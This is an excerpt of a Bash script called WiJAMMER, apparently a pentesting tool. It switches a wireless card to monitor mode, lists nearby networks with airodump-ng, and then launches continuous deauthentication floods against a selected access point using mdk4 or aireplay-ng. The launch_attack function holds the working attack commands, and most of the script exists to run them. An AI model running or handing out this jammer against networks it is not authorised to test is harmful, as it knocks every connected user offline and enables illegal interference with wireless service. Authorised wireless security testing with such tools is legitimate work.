...
function banner() 
{
  toilet -f mono9 --filter border -F metal WiJAMMER
  toilet -f digital -F metal From PENTROSINT
  #echo -e "https://github.com/Gopalakrishnan20"
...
function interface() 
{
  ...
  echo ""
  echo -ne "${bgG}${H}WiJAMMER${RST}:${C}${BOLD}Interface${RST} => "; 
  read slct_interface
  echo ""
...
function check_mode() 
{
  ...
  if [[ $mode == *'monitor'* ]]; then
    echo -e "\n[${Y}${BOLD}*${RST}] Thank god Interface already in monitor mode"
    sleep 2
    ...
    echo -e "\n[${R}${BOLD}!${RST}] OOpsie...! Interface isnt on monitor mode!"
    sleep 2
    loading2
    change_mode
  fi
...
function change_mode() 
{
  ...
  if [[ $chck == *'monitor'* ]]; then
    echo -e "\n\n[${G}${BOLD}+${RST}] Successfully changed to monitor mode"
    sleep 2
    echo -e "[${G}${BOLD}+${RST}] Set ${C}${BOLD}$iface${RST} to main interface"
    sleep 2
    clear
...
function weapons() 
{
  ...
  echo -ne "\n${bgR}${H}WiJAMMER${RST}:${C}${BOLD}Weapons${RST} => "; read slct_weapons
...
function target() 
{
  ...
  xterm -e /bin/bash -l -c "sudo airodump-ng -w tmp/target --output-format csv ${iface}"
  clear
  banner
  ...
  echo -ne "\n${bgR}${H}WiJAMMER${RST}:${C}${BOLD}Target${RST} => "; read slct_target
...
function launch_attack() 
{
  ...
  echo -ne "${bgR}${H}WiJAMMER${RST}:${C}${BOLD}Attack${RST} => "; read launch
  if [[ $launch == y ]] || [[ $launch == Y ]]; then
    ...
    case $slct_weapons in
      1 )
        xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "sudo mdk4 ${iface} d -B ${BSSID} -c ${channel}"
        ;;
      2 )
        xterm -T "Wait... Set Channel" -e /bin/bash -l -c "timeout 2 airodump-ng -c ${channel} ${iface}"
        sleep 3
        xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "sudo aireplay-ng -0 0 -a ${BSSID} wlan0"
    esac
    echo -e "\n[${Y}${BOLD}*${RST}] Do you want to exit?[${G}y${RST}/${R}n${RST}]"
    echo -ne "\n${bgR}${H}WiJAMMER${RST}:${C}${BOLD}eXit?${RST} => "; read close
...
{
  for (( i = 0; i <= 8 ; i++ )); do
    echo -ne "[${C}―${RST}] Changeing interface mode to monitor...\r"
    sleep 0.1
    echo -ne "[\]\r"
    sleep 0.1
    echo -ne "[${C}￨${RST}]\r"
...
{
  for (( i = 0; i <= 8 ; i++ )); do
    echo -ne "[${C}―${RST}] Checking interface mode...\r"
    sleep 0.1
    echo -ne "[\]\r"
    sleep 0.1
    echo -ne "[${C}￨${RST}]\r"
...
function quit() 
{
  ...
  if [[ $( iw $iface info | grep "type" ) == *'monitor'* ]]; then
    ...
    sudo airmon-ng stop $iface > /dev/null 2>&1
  fi
  sleep 2
  echo -e "[${Y}${BOLD}*${RST}] Thx for using my script :) nandri meendum varuga"
  exit
}
